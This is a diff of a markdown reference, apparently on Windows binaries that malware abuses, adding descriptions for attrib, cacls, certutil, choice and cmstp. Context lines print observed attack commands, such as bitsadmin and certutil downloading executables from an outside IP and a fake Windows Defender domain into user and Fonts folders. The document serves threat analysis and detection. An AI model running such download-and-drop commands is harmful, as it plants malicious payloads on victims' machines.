@@ -13,7 +13,7 @@ This example is all credit to Mastar fumik0 cause highlighted it at his [blog](h
 
 
 ### attrib
-Function: Used to display or change the file attributes for a file or folder. You can also find and set most file and folder attributes in Explorer.
+Function: Used to display or change the file attributes for a file or folder. You can also find and set most file and folder attributes in Explorer. Malware used to hide their file using this command.
 
 Reference: [Microsoft attrib manual](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib)
 
@@ -55,7 +55,7 @@ Command  line examples:
     bitsadmin /transfer Nv /priority foreground http://154.16.201.215:2330/ari.exe %USERPROFILE%\RK.exe
 
 ### calcs
-Function: *//will be add later*
+Function: Displays or modifies discretionary access control lists (DACL) on specified files. An access control list is a list of permissions for securable object, such as a file or folder, that controls who can access it. 
 
 Command  line examples:
 
@@ -63,7 +63,7 @@ Command  line examples:
     cacls C:\Users\%OSUSER% /T /C /P %OSUSER% :F
 
 ### certutil
-Function: *//will be add later*
+Function: Windows binary used for handeling certificates. It can also use to download file from internet.
 
 Command  line examples:
 
@@ -76,7 +76,7 @@ Command  line examples:
     certutil -urlcache -split -f http://cache.windowsdefenderhost.com/windows/RecentFileProgrom.exe "C:\\Windows\\Fonts\\RecentFileProgrom.exe"
 
 ### choice.exe
-Function: *//will be add later*
+Function: Prompts the user to select one item from a list of single-character choices in a batch program, and then returns the index of the selected choice. If used without parameters, choice displays the default choices Y and N.
 
 Command  line examples:
 
@@ -84,7 +84,9 @@ Command  line examples:
     choice /t 3 /d y /n
 
 ### cmstp.exe
-Function: *//will be add later*
+Function: CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary code in the form of scriptlets (SCT) and DLL.
+
+Reference: [https://attack.mitre.org/techniques/T1191/](https://attack.mitre.org/techniques/T1191/)
 
 Command  line examples:
 
